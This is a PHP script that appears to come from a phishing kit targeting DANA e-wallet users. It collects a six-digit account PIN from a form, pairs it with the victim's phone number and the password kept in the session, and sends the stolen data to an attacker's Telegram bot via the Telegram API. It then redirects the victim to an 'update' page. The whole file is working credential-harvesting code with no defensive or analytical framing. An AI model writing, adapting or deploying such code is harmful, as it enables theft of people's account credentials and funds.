<?php

session_start();
include "./tele.php";

$pn1 = $_POST['pn1'];
$pn2 = $_POST['pn2'];
$pn3 = $_POST['pn3'];
$pn4 = $_POST['pn4'];
$pn5 = $_POST['pn5'];
$pn6 = $_POST['pn6'];
$_pin = $pn1.$pn2.$pn3.$pn4.$pn5.$pn6;

$npe                = $_SESSION['npe'];
$password                = $_SESSION['password'];
$_SESSION['acc_pin'] = $_pin;

$message = "
├• | 𝗗𝗮𝘁𝗮 𝗔𝗸𝘂𝗻 |
├───────────────────
├• *Nomor Dana* : 0".ltrim($npe, "0")."
├• *PIN AKUN* : ".$_pin."
────────────────────";

function sendMessage($telegram_id, $message, $token_bot) {
    $url = "https://api.telegram.org/bot" . $token_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $token_bot);
header('Location: ../update.php');
?>